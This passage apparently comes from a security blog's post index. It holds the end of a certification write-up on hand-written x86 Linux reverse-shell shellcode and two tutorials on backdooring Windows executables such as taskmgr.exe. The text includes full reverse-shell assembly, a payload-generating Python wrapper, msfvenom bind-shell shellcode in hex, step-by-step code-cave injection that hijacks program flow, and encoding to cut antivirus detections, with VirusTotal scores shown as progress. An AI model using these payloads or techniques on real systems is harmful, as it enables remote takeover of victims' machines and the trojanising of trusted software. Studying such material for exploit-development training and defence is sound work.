first thing required is to clean the registers, as when we execute our program, it will work as a charm. Nevertheless, when introduced into a real program, within a context of binary exploitation, with different variables that modify the registers, it may not. Due to this, it’s better to have a set of instructions that clean the registers that will be employed:global _startsection .text_start: xor eax, eax ; Zeroes out EAX. xor ebx, ebx ; Zeroes out EBX. xor ecx, ecx ; Zeroes out ECX. xor edx, edx ; Zeroes out EDX.SocketCreates an endpoint for communicationOur next step is to initialize the socket. In order to concrete such action, it is required to move the value of the socket (359) syscall into eax. I have chosen to push the value as a word into the ax register, in order to avoid null characters. Furthermore, according to the syscall man page for socket, the required flags involve domain (EBX), type (ECX) and protocol (EDX). A common combination when it comes to remote shells is AF_INET, SOCK_STREAM. According to this file, the value of AF_INET is 2 and SOCK_STREAM 1, therefore, this will be reflected on the EBX and ECX registers. Finally, the value of protocol (EDX) isn’t actually very relevant. Due to this, EDX is simply pushed. push word 359 ; Pushes word 359 (socket) into the stack. pop ax ; Pops such word into ax so there are no nulls. mov bl, 2 ; Moves value 2 into bl, giving the value AF_INET. mov cl, 1 ; Moves value 1 into bl, giving the value SOCK_STREAM. push edx ; There isn't anything really needed within this parameter, so 0 is pushed from EDX. int 0x80 ; Call to kernel. mov esi, eax ; Saves the value of eax for sockfd values later on.As explained on the previous post, we can see that the value of EAX is being saved on ESI, this will be from great help when referring to the socket syscall as a file descriptor.ConnectInitiate a connection on a socketThe following step is to initiate a connection on the socket. The arguments according the man page are the following: int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);. As you may see, the required flags are quite the same to the bind syscall in the previous post. Nonetheless, if you remember, in the previous post a value of 0 was pushed within the IP protocol argument, value which will be essential this time, therefore, the order will be the following: 0 (As it is required to push 0, the instruction PUSH EDX will be used.) IP Address (As this is a reverse shell, it is required to point to a specific address. Due to the aforementioned, this will be set to our IP within hex.) Chosen Port (The chosen port will be pushed in hex as a word.) AF_INETFurthermore, we have to satisfy the socklen_t addrlen argument as well. This requires the length of the previous struct, as like in the previous chapter, it was 16 (any value above this could be used as well) . This will be reflected upon the value of DL.Syscall value:root@whitecr0wz:~# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep connect #define __NR_connect 362root@whitecr0wz:~#connect: push word 362 ; Pushes word 362 (connect) into the stack pop ax ; Pops such word into ax so there are no nulls. mov ebx, esi ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall. push edx ; Pushes 0. push dword 0x8b64a8c0 ; Pushes 192.168.100.139 in hex as a DWORD. push word 0x2823 ; Pushes 9000 in hex as a WORD. push word 0x02 ; Pushes AF_INET into the stack. mov ecx, esp ; Copies the value of ESP into ECX. mov dl, 30 ; The value 30 is inserted into DL. Anything above 16 can be used. int 0x80 ; Call to kernel.Dup2Duplicate a file descriptorOnce again, we encounter ourselves with our buddy Dup2. This syscall will make our communication with the compromised device interactive by duplicating the file descriptors STDIN (0), STDOUT (1), and STDERR (2) into our connection. Furthermore, as this requires that dup2 is iterated 3 times, a loop that is executed in such on three occasions will be implemented that performs such task as long as the zero flag (ZF) is not set.Syscall value:root@whitecr0wz:~# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep dup2#define __NR_dup2 63root@whitecr0wz:~#manpage arguments: int dup2(int oldfd, int newfd); xor ecx, ecx ; Zeroes out ECX. mov cl, 0x3 ; Starts counter for dup2.dup2: xor eax, eax ; Zeroes out EAX. push word 63 ; Pushes word 63 (dup2) into the stack. pop ax ; Pops such word into ax so there are no nulls. mov ebx, esi ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall. dec cl ; Decrements cl in order to set the zero flag (ZF) int 0x80 ; Call to kernel. jnz dup2 ; Jump if the zero flag (ZF) is not set, this will continue the loop 3 times.ExecveExecute programFinally, the last syscall left to initialize is Execve, which will execute the program when the connection is stablished.Syscall value:root@whitecr0wz:~# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep execve #define __NR_execve 11#define __NR_execveat 358root@whitecr0wz:~# manpage arguments:int execve(const char *pathname, char *const argv[], char *const envp[]);The procedure with this syscall will be the following: The program desired to execute will be /bin/bash. The string “////bin/bash” (additional slashes in order to be divisible by 4) will be pushed into the stack and then saved into EBX. EDX will be set to 0 as the value envp[] is not required. EBX will be pushed and saved into ECX. Execve will be called.execve: xor eax, eax ; Zeroes out EAX. push eax ; Pushes EAX (0x00000000). PUSH 0x68736162 ; hsab PUSH 0x2f6e6962 ; /nib PUSH 0x2f2f2f2f ; //// mov ebx, esp ; Copies the pushed instructions into EBX. push eax ; Pushes EAX (0x00000000). mov edx, esp ; Copies the value of ESP (0x00000000) into EDX, giving envp[] a value of 0. push ebx ; Pushes ////bin/bash into the stack. mov ecx, esp ; Copies such value to ECX. push word 11 ; Pushes word 11 (execve) into the stack. pop ax ; Pops such word into ax so there are no nulls. int 0x80 ; Calls to kernel.Let’s test our shellcode.Wonderful!Final Code:global _startsection .text_start: xor eax, eax ; Zeroes out EAX. xor ebx, ebx ; Zeroes out EBX. xor ecx, ecx ; Zeroes out ECX. xor edx, edx ; Zeroes out EDX. push word 359 ; Pushes word 359 (socket) into the stack. pop ax ; Pops such word into ax so there are no nulls. mov bl, 2 ; Moves value 2 into bl, giving the value AF_INET. mov cl, 1 ; Moves value 1 into bl, giving the value SOCK_STREAM. push edx ; There isn't anything really needed within this parameter, so 0 is pushed from EDX. int 0x80 ; Call to kernel. mov esi, eax ; Saves the value of eax for sockfd values later on.connect: push word 362 ; Pushes word 362 (connect) into the stack pop ax ; Pops such word into ax so there are no nulls. mov ebx, esi ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall. push edx ; Pushes 0. push dword 0x8b64a8c0 ; Pushes 192.168.100.139 in hex as a DWORD. push word 0x2823 ; Pushes 9000 in hex as a WORD. push word 0x02 ; Pushes AF_INET into the stack. mov ecx, esp ; Copies the value of ESP into ECX. mov dl, 30 ; The value 30 is inserted into DL, anything above 16 can be used. int 0x80 ; Call to kernel. xor ecx, ecx ; Zeroes out ECX. mov cl, 0x3 ; Starts counter for dup2.dup2: xor eax, eax ; Zeroes out EAX. push word 63 ; Pushes word 63 (dup2) into the stack. pop ax ; Pops such word into ax so there are no nulls. mov ebx, esi ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall. dec cl ; Decrements cl in order to set the zero flag (ZF) int 0x80 ; Call to kernel. jnz dup2 ; Jump if the zero flag (ZF) is not set, this will continue the loop 3 times.execve: xor eax, eax ; Zeroes out EAX. push eax ; Pushes EAX (0x00000000). PUSH 0x68736162 ; hsab PUSH 0x2f6e6962 ; /nib PUSH 0x2f2f2f2f ; //// mov ebx, esp ; Copies the pushed instructions into EBX. push eax ; Pushes EAX (0x00000000). mov edx, esp ; Copies the value of ESP (0x00000000) into EDX, giving envp[] a value of 0. push ebx ; Pushes ////bin/bash into the stack. mov ecx, esp ; Copies such value to ECX. push word 11 ; Pushes word 11 (execve) into the stack. pop ax ; Pops such word into ax so there are no nulls. int 0x80 ; Calls to kernel.The WrapperAs stated in the introduction, one additional detail given in the assignment is to create a wrapper (in any language) that easily configures the address and port for the reverse shell.Wrapper code:import socket, sys, structif len(sys.argv) != 3: print \"[*] Example: /usr/bin/python wrapper.py &lt;IP address&gt; &lt;port&gt;\" sys.exit(1)address = sys.argv[1]address = address.split('.')hexaddress = hex(int(address[0])) + hex(int(address[1])) + hex(int(address[2])) + hex(int(address[3]))hexaddress = hexaddress.replace('0x', '')hexaddress = hexaddress.upper()final_address = \"\\\\x\"+\"\\\\x\".join(a+b for a,b in zip(hexaddress[::2],hexaddress[1::2]))port = sys.argv[2]port = int(port)port = socket.htons(port)hexport = hex(port)hexport = struct.pack(\"&lt;H\", port).encode(\"hex\")final_port = \"\\\\x\"+\"\\\\x\".join(a+b for a,b in zip(hexport[::2],hexport[1::2]))buf = (\"\\\\x31\\\\xc0\\\\x31\\\\xdb\\\\x31\\\\xc9\\\\x31\\\\xd2\\\\x66\\\\x68\\\\x67\\\\x01\\\\x66\\\\x58\\\\xb3\"\"\\\\x02\\\\xb1\\\\x01\\\\x52\\\\xcd\\\\x80\\\\x89\\\\xc6\\\\x66\\\\x68\\\\x6a\\\\x01\\\\x66\\\\x58\\\\x89\"\"\\\\xf3\\\\x52\\\\x68\"+ final_address +\"\\\\x66\\\\x68\"+ final_port +\"\\\\x66\\\\x6a\\\\x02\\\\x89\"\"\\\\xe1\\\\xb2\\\\x1e\\\\xcd\\\\x80\\\\x31\\\\xc9\\\\xb1\\\\x03\\\\x31\\\\xc0\\\\x66\\\\x6a\\\\x3f\\\\x66\"\"\\\\x58\\\\x89\\\\xf3\\\\xfe\\\\xc9\\\\xcd\\\\x80\\\\x75\\\\xf1\\\\x31\\\\xc0\\\\x50\\\\x68\\\\x62\\\\x61\"\"\\\\x73\\\\x68\\\\x68\\\\x62\\\\x69\\\\x6e\\\\x2f\\\\x68\\\\x2f\\\\x2f\\\\x2f\\\\x2f\\\\x89\\\\xe3\\\\x50\"\"\\\\x89\\\\xe2\\\\x53\\\\x89\\\\xe1\\\\x66\\\\x6a\\\\x0b\\\\x66\\\\x58\\\\xcd\\\\x80\")print '\"' + (buf) + '\"'Executing the wrapper:whitecr0wz@SLAE:~/assembly/assignments/Assignment_2$ python wrapper.py 192.168.100.139 65434 \"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\x68\\x67\\x01\\x66\\x58\\xb3\\x02\\xb1\\x01\\x52\\xcd\\x80\\x89\\xc6\\x66\\x68\\x6a\\x01\\x66\\x58\\x89\\xf3\\x52\\x68\\xC0\\xA8\\x64\\x8B\\x66\\x68\\xff\\x9a\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x1e\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0\\x66\\x6a\\x3f\\x66\\x58\\x89\\xf3\\xfe\\xc9\\xcd\\x80\\x75\\xf1\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\x66\\x6a\\x0b\\x66\\x58\\xcd\\x80\"whitecr0wz@SLAE:~/assembly/assignments/Assignment_2$Let’s test this on a C file to make sure that the shellcode could work on a real environment:#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned char code[] = \\\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\x68\\x67\\x01\\x66\\x58\\xb3\\x02\\xb1\\x01\\x52\\xcd\\x80\\x89\\xc6\\x66\\x68\\x6a\\x01\\x66\\x58\\x89\\xf3\\x52\\x68\\xC0\\xA8\\x64\\x8B\\x66\\x68\\xff\\x9a\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x1e\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0\\x66\\x6a\\x3f\\x66\\x58\\x89\\xf3\\xfe\\xc9\\xcd\\x80\\x75\\xf1\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\x66\\x6a\\x0b\\x66\\x58\\xcd\\x80\";main(){ printf(\"Shellcode Length: %d\\n\", strlen(code)); int (*ret)() = (int(*)())code; ret();}EndGameCodeThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/Student ID: SLAE-27812/PA-27812You can find all of the used resources within this post here." }, { "title": "Beating ASLR & NX/DEP without PE Headers/Code Caves (VOL:III)", "url": "/posts/Backdooring-PE-III/", "categories": "Backdooring", "tags": "assembly, shellcoding", "date": "2020-10-22 05:44:00 +0000", "snippet": "IntroductionYou find yourself reading the third volume of the “PE File Backdooring” series. As a result of such, I highly recommend reading the first and second blog post of the series, as it may help understanding the shown material on this post.Today, I will be explaining how to backdoor PE Files when heavy protections such as ASLR and NX/DEP are present without altering the binary at all.Furthermore, in order to replay the concept, the well-known task manager will be employed, due to the reason that it has all protections enabled and as it is a common executable.Let’s check for available Code Caves just by curiosity.C:\\Users\\IEUser\\AppData\\Local\\Programs\\Python\\Python38-32&gt;python.exe pycave.py -f C:\\Windows\\system32\\taskmgr.exe[+] Minimum code cave size: 300[+] Image Base: 0x00400000[+] Loading \"C:\\Windows\\system32\\taskmgr.exe\"...[!] ASLR is enabled. Virtual Address (VA) could be different once loaded in memory.[+] Looking for code caves...[+] Code cave found in .data Size: 4796 bytes RA: 0x0001D694VA: 0x0041E094[+] Code cave found in .data Size: 779 bytes RA: 0x0001E9B1VA: 0x0041F3B1[+] Code cave found in .data Size: 379 bytes RA: 0x0001EF9DVA: 0x0041F99D[+] Code cave found in .rsrc Size: 725 bytes RA: 0x00024EAFVA: 0x00426AAF[+] Code cave found in .rsrc Size: 682 bytes RA: 0x000252DEVA: 0x00426EDE[+] Code cave found in .rsrc Size: 700 bytes RA: 0x00027434VA: 0x00429034[+] Code cave found in .rsrc Size: 334 bytes RA: 0x00027886VA: 0x00429486[+] Code cave found in .rsrc Size: 312 bytes RA: 0x00028760VA: 0x0042A360[+] Code cave found in .rsrc Size: 308 bytes RA: 0x0002910CVA: 0x0042AD0C[+] Code cave found in .rsrc Size: 585 bytes RA: 0x0002C233VA: 0x0042DE33[+] Code cave found in .rsrc Size: 369 bytes RA: 0x0002FCFBVA: 0x004318FB[+] Code cave found in .rsrc Size: 585 bytes RA: 0x00033613VA: 0x00435213C:\\Users\\IEUser\\AppData\\Local\\Programs\\Python\\Python38-32&gt;Interesting, we see several places in which we could inject our payload. However, this is actually not possible, as NX/DEP would prevent our instructions from being executed. Of course, we could just change the properties of certain sections such as .data or .rsrc, but this is actually found off the bounds of this post, isn’t it? We need to circumvent such environment without changing the binary too much.Let’s check the enabled protections.As aforementioned, everything seems enabled.As we are unable to use a the addition of a PE Header and a Code Cave, we are left with pretty scarce options. Nevertheless, if checked on most binaries, at the bottom of the stack, we may find unused data that is partially executable.It isn’t quite much, perhaps among 500 bytes, but it sure is enough to fit our payload and execute it. Sadly, encoding is not available in such scenarios, as the section is too privileged for certain encoding characters which are obligatory.Let’s check the entrypoint, as such addresses will be later on restored as explained on the previous posts.We see a CALL towards 00D68396. As we need to restore this function later on, if we simply replace it with a JMP, we may not have the address to restore due to ASLR.For such reasons, I will perform this step at the ending, placing the PUSHAD/PUSHFD + shellcode + alignment + POPFD/POPAD + restore first and then replace the entrypoint atlast.For this scenario, I will use address 00D7DE67.Placing PUSHAD/PUSHFD.Generating shellcode.root@whitecr0wz:~# msfvenom -p windows/shell_bind_tcp LPORT=9000 -f hex [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 328 bytesFinal size of hex file: 656 bytesfce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd56a085950e2fd4050405068ea0fdfe0ffd597680200232889e66a10565768c2db3767ffd55768b7e938ffffd5576874ec3be1ffd5579768756e4d61ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5root@whitecr0wz:~# Pasting the shellcode.Performing additional modifications to the shellcode.Placing the alignment.Inserting the POPFD/POPAD instructions.Restoring the CALL instruction.Now, we could simply replace the CALL instruction without any issue.Assembling the JMP towards the following address of the entrypoint.This is then saved.Replacing the entrypoint for a JMP instruction towards our unused bytes. Even though ASLR is enabled, it should be clarified that JMP instructions do not hardcode their address, as if we remember in the last post, the address the instruction was pointing to changed whenever the location of the JMP was modified, meaning that all JMP opcodes are relative to their location and do not hardcode addresses. In fact, you could even calculate the distance between the unused bytes and the Entry Point and the result would be the same.This is then saved.If this is run, we may see how the shellcode is executed as intended without any complication!Results of VirusTotal:Even though the results are very weak, this could be improved by changing this shellcode for one that is not as known, as the one used for these posts is pretty noisy against Anti-Malware software. Furthermore, the techniques discussed on the previous post could be from great help in order to lower the detection.Thank you for reading!ReferencesCapt. Meelo’s post: https://captmeelo.com/exploitdev/osceprep/2018/07/21/backdoor101-part2.html.Online x86/x64 Assembler/Disassembler: https://defuse.ca/online-x86-assembler.htm#disassembly2." }, { "title": "Backdooring PE Files through Code Caves + User Interaction + Encoding (VOL:II)", "url": "/posts/Backdooring-PE-II/", "categories": "Backdooring", "tags": "assembly, shellcoding", "date": "2020-10-21 05:44:00 +0000", "snippet": "IntroductionYou find yourself reading the second volume of the “PE File Backdooring” series. As a result of such, I highly recommend reading the first one, as it may help understanding the shown material on this post.Today, I will be explaining how to backdoor PE Files with the addition of user interaction and encoding as well. Furthermore, in order to replay the concept, the application recmp3 will be used, as it is a lightweight program which has several Code Caves with ASLR disabled within the affected zone.recmp3 when executed.Let’s check the available Code Caves.C:\\Users\\IEUser\\AppData\\Local\\Programs\\Python\\Python38-32&gt;python.exe pycave.py -f \"C:\\Users\\IEUser\\Desktop2\\RadioRecord\\RadioRecord.exe\"[+] Minimum code cave size: 300[+] Image Base: 0x00400000[+] Loading \"C:\\Users\\IEUser\\Desktop2\\RadioRecord\\RadioRecord.exe\"...[+] Looking for code caves...[+] Code cave found in .data Size: 559 bytes RA: 0x000A3E79VA: 0x004A3E79[+] Code cave found in .data Size: 8195 bytes RA: 0x000A41FDVA: 0x004A41FD[+] Code cave found in .rsrc Size: 513 bytes RA: 0x000A94AFVA: 0x004C24AF[+] Code cave found in .rsrc Size: 513 bytes RA: 0x000A9A27VA: 0x004C2A27C:\\Users\\IEUser\\AppData\\Local\\Programs\\Python\\Python38-32&gt;0x004A41FD seems rather juicy, with more than 5000+ bytes! This code cave seems rather interesting.When the fun begins.As we desire to make the PE File execute shellcode when interacted with in a certain manner, it is required to discover a place to intervene with the flow. For example, if we check the option “About”, the program displays the following.As it is seen, this allows us to gather information of the program and its author. We can use this function to our advantage. Let’s investigate this function in Immunity.In order to find such, the option “Search For &gt; All referenced text strings” will be used. This will search for all text strings that are somehow being used or pushed into the stack.It is gone to the top in order to search for a key phrase, such as for example, “sourceforge”.Immunity seems to have given us the desired result. Similarly to the previous blog post, the following step is to replace a specific address that is being executed when the function is processed with a JMP instruction pointing to our code cave. In addition with this, when we finish with our shellcode and aligning the stack, the overwriten address is executed once again and a JMP instruction is placed pointing to the original flow.In this case, I will replace the PUSH instruction that gives us the information. Moreover, the instructions will be saved so that they are re-assigned later on.The next step; assembling a JMP address to our code cave at 0x004A41FD, at the same time overwriting the address at 0x00403426.Good, this is then saved as in the previous post through “Copy to Executable” into a new file. Furthermore, if we now make use of the option “About” once again, the flow will be redirected to the code cave.Now, in contemplation of jumping to the code cave without any difficulty,the bytes prior and after 0x004A41FD will be replaced by NOPs.Similarly to VOL:I of the series, the order of our payload is the following: PUSHAD/PUSHFD instructions. These will save our registers/flags so that they are aligned later on. It is essential for the registers/flags to be aligned so that the instructions work perfectly according to the value of these. The Shellcode. Shellcode, we are used to it. Some modifications may need to be issued, such as the removal of the last instruction in some cases, as it tends to crash the flow and the modification of a byte which waits for the shellcode to exit for the main program to return its original flow. Alignment. The ESP Register must be restored to its old value. POPFD/POPAD. These instructions will restore our registers/flags. As when assembling the JMP on the entry point instruction some other instructions were replaced, these must be assembled once again so that the code runs as intended and does not crash! A JMP instruction pointing towards the following instruction after the replaced ones within the original function. In this case, it will be 0x0040342B.Remembering this order, the PUSHAD/PUSHFD instructions are assembled.The payload used will be the same as the previous, a unstaged bind shell that will display at port 9000.Generating the payload.root@whitecr0wz:~# msfvenom -p windows/shell_bind_tcp LPORT=9000 -f hex [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 328 bytesFinal size of hex file: 656 bytesfce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd56a085950e2fd4050405068ea0fdfe0ffd597680200232889e66a10565768c2db3767ffd55768b7e938ffffd5576874ec3be1ffd5579768756e4d61ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5root@whitecr0wz:~# The shellcode is pasted with “Binary paste”.DEC ESI is replaced for a NOP, this is done so that it allows the execution to continue after the shell is established.The final CALL EBP is removed as it would completely demolish the flow. Instead, the stack alignment is placed, which is the same that in the aforementioned post, as the payload is exactly the same.The stack alignment is placed.The POPAD/POPFD instructions are placed.The PUSH address is re-assigned.The JMP address pointing to 0x0040342B is assembled.EndGame #1VirusTotal results:Although there is big room for improvement, 26 from VOL:I to 18 is a great enhancement.EncodingHowever, things are far from over, as I will not stop to a result of 18, therefore, I thought of a simple method for encoding the entire payload. This consists in copying the entire chunk of instructions (including the PUSHAD/PUSHFD) and encode them with msfvenom. In addition, these are later on assembled once again encoded.The steps would be the following: Copying the entire set of instructions with “Binary Copy”. Convert the fromat into hex escape sequences Encode the payload with msfvenom with an encoder such as x86/xor_dynamic, x86/shikata_ga_nai, x86/alpha_mixed, and so forth. Paste the entire set of instructions once again with “Binary Paste”. As encoding will definitely increment the length of the instructions, the final JMP instruction back to the original flow may be seemed altered to an undesired address; therefore, the encoded payload must be decoded, and the JMP must be assembled once again to the desired address, giving a different opcode that will make us encode the payload once again with the correct values.This sounds way harder than it actually is, let’s do it!Copying the entire payload with “Binary Copy”.This will copy the instructions to our clipboard in a hex format, similar to msfvenom when providing a payload. However, this is not the one that we need, reason why I used defuse.ca, that will turn the hex format into the escape sequences as desired for you, just paste them on the “Disassemble” section and process them. You can also perform this task manually, but it may take you a very long time.Raw payload:60 9C FC E8 82 00 00 00 60 89 E5 31 C0 64 8B 50 30 8B 52 0C 8B 52 14 8B 72 28 0F B7 4A 26 31 FFAC 3C 61 7C 02 2C 20 C1 CF 0D 01 C7 E2 F2 52 57 8B 52 10 8B 4A 3C 8B 4C 11 78 E3 48 01 D1 51 8B59 20 01 D3 8B 49 18 E3 3A 49 8B 34 8B 01 D6 31 FF AC C1 CF 0D 01 C7 38 E0 75 F6 03 7D F8 3B 7D24 75 E4 58 8B 58 24 01 D3 66 8B 0C 4B 8B 58 1C 01 D3 8B 04 8B 01 D0 89 44 24 24 5B 5B 61 59 5A51 FF E0 5F 5F 5A 8B 12 EB 8D 5D 68 33 32 00 00 68 77 73 32 5F 54 68 4C 77 26 07 FF D5 B8 90 0100 00 29 C4 54 50 68 29 80 6B 00 FF D5 6A 08 59 50 E2 FD 40 50 40 50 68 EA 0F DF E0 FF D5 97 6802 00 23 28 89 E6 6A 10 56 57 68 C2 DB 37 67 FF D5 57 68 B7 E9 38 FF FF D5 57 68 74 EC 3B E1 FFD5 57 97 68 75 6E 4D 61 FF D5 68 63 6D 64 00 89 E3 57 57 57 31 F6 6A 12 59 56 E2 FD 66 C7 44 243C 01 01 8D 44 24 10 C6 00 44 54 50 56 56 56 46 56 4E 56 56 53 56 68 79 CC 3F 86 FF D5 89 E0 9056 46 FF 30 68 08 87 1D 60 FF D5 BB F0 B5 A2 56 68 A6 95 BD 9D FF D5 3C 06 7C 0A 80 FB E0 75 05BB 47 13 72 6F 6A 00 53 81 C4 00 02 00 00 9D 61 68 B8 7F 49 00 E9 BA F0 F5 FFPayload within escape sequence format:\"\\x60\\x9C\\xFC\\xE8\\x82\\x00\\x00\\x00\\x60\\x89\\xE5\\x31\\xC0\\x64\\x8B\\x50\\x30\\x8B\\x52\\x0C\\x8B\\x52\\x14\\x8B\\x72\\x28\\x0F\\xB7\\x4A\\x26\\x31\\xFF\\xAC\\x3C\\x61\\x7C\\x02\\x2C\\x20\\xC1\\xCF\\x0D\\x01\\xC7\\xE2\\xF2\\x52\\x57\\x8B\\x52\\x10\\x8B\\x4A\\x3C\\x8B\\x4C\\x11\\x78\\xE3\\x48\\x01\\xD1\\x51\\x8B\\x59\\x20\\x01\\xD3\\x8B\\x49\\x18\\xE3\\x3A\\x49\\x8B\\x34\\x8B\\x01\\xD6\\x31\\xFF\\xAC\\xC1\\xCF\\x0D\\x01\\xC7\\x38\\xE0\\x75\\xF6\\x03\\x7D\\xF8\\x3B\\x7D\\x24\\x75\\xE4\\x58\\x8B\\x58\\x24\\x01\\xD3\\x66\\x8B\\x0C\\x4B\\x8B\\x58\\x1C\\x01\\xD3\\x8B\\x04\\x8B\\x01\\xD0\\x89\\x44\\x24\\x24\\x5B\\x5B\\x61\\x59\\x5A\\x51\\xFF\\xE0\\x5F\\x5F\\x5A\\x8B\\x12\\xEB\\x8D\\x5D\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5F\\x54\\x68\\x4C\\x77\\x26\\x07\\xFF\\xD5\\xB8\\x90\\x01\\x00\\x00\\x29\\xC4\\x54\\x50\\x68\\x29\\x80\\x6B\\x00\\xFF\\xD5\\x6A\\x08\\x59\\x50\\xE2\\xFD\\x40\\x50\\x40\\x50\\x68\\xEA\\x0F\\xDF\\xE0\\xFF\\xD5\\x97\\x68\\x02\\x00\\x23\\x28\\x89\\xE6\\x6A\\x10\\x56\\x57\\x68\\xC2\\xDB\\x37\\x67\\xFF\\xD5\\x57\\x68\\xB7\\xE9\\x38\\xFF\\xFF\\xD5\\x57\\x68\\x74\\xEC\\x3B\\xE1\\xFF\\xD5\\x57\\x97\\x68\\x75\\x6E\\x4D\\x61\\xFF\\xD5\\x68\\x63\\x6D\\x64\\x00\\x89\\xE3\\x57\\x57\\x57\\x31\\xF6\\x6A\\x12\\x59\\x56\\xE2\\xFD\\x66\\xC7\\x44\\x24\\x3C\\x01\\x01\\x8D\\x44\\x24\\x10\\xC6\\x00\\x44\\x54\\x50\\x56\\x56\\x56\\x46\\x56\\x4E\\x56\\x56\\x53\\x56\\x68\\x79\\xCC\\x3F\\x86\\xFF\\xD5\\x89\\xE0\\x90\\x56\\x46\\xFF\\x30\\x68\\x08\\x87\\x1D\\x60\\xFF\\xD5\\xBB\\xF0\\xB5\\xA2\\x56\\x68\\xA6\\x95\\xBD\\x9D\\xFF\\xD5\\x3C\\x06\\x7C\\x0A\\x80\\xFB\\xE0\\x75\\x05\\xBB\\x47\\x13\\x72\\x6F\\x6A\\x00\\x53\\x81\\xC4\\x00\\x02\\x00\\x00\\x9D\\x61\\x68\\xB8\\x7F\\x49\\x00\\xE9\\xBA\\xF0\\xF5\\xFF\"In order to encode the payload, the STDIN function from msfvenom shall be used. So as to achievethis result, a python script will be employed, that may contain a variable with the payload, so that it is then printed into the command-line. Moreover, msfvenom will analyze such data and encode it.Python script:root@whitecr0wz:~# cat custom.py shellcode = (\"\\x60\\x9C\\xFC\\xE8\\x82\\x00\\x00\\x00\\x60\\x89\\xE5\\x31\\xC0\\x64\\x8B\\x50\\x30\\x8B\\x52\\x0C\\x8B\\x52\\x14\\x8B\\x72\\x28\\x0F\\xB7\\x4A\\x26\\x31\\xFF\\xAC\\x3C\\x61\\x7C\\x02\\x2C\\x20\\xC1\\xCF\\x0D\\x01\\xC7\\xE2\\xF2\\x52\\x57\\x8B\\x52\\x10\\x8B\\x4A\\x3C\\x8B\\x4C\\x11\\x78\\xE3\\x48\\x01\\xD1\\x51\\x8B\\x59\\x20\\x01\\xD3\\x8B\\x49\\x18\\xE3\\x3A\\x49\\x8B\\x34\\x8B\\x01\\xD6\\x31\\xFF\\xAC\\xC1\\xCF\\x0D\\x01\\xC7\\x38\\xE0\\x75\\xF6\\x03\\x7D\\xF8\\x3B\\x7D\\x24\\x75\\xE4\\x58\\x8B\\x58\\x24\\x01\\xD3\\x66\\x8B\\x0C\\x4B\\x8B\\x58\\x1C\\x01\\xD3\\x8B\\x04\\x8B\\x01\\xD0\\x89\\x44\\x24\\x24\\x5B\\x5B\\x61\\x59\\x5A\\x51\\xFF\\xE0\\x5F\\x5F\\x5A\\x8B\\x12\\xEB\\x8D\\x5D\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5F\\x54\\x68\\x4C\\x77\\x26\\x07\\xFF\\xD5\\xB8\\x90\\x01\\x00\\x00\\x29\\xC4\\x54\\x50\\x68\\x29\\x80\\x6B\\x00\\xFF\\xD5\\x6A\\x08\\x59\\x50\\xE2\\xFD\\x40\\x50\\x40\\x50\\x68\\xEA\\x0F\\xDF\\xE0\\xFF\\xD5\\x97\\x68\\x02\\x00\\x23\\x28\\x89\\xE6\\x6A\\x10\\x56\\x57\\x68\\xC2\\xDB\\x37\\x67\\xFF\\xD5\\x57\\x68\\xB7\\xE9\\x38\\xFF\\xFF\\xD5\\x57\\x68\\x74\\xEC\\x3B\\xE1\\xFF\\xD5\\x57\\x97\\x68\\x75\\x6E\\x4D\\x61\\xFF\\xD5\\x68\\x63\\x6D\\x64\\x00\\x89\\xE3\\x57\\x57\\x57\\x31\\xF6\\x6A\\x12\\x59\\x56\\xE2\\xFD\\x66\\xC7\\x44\\x24\\x3C\\x01\\x01\\x8D\\x44\\x24\\x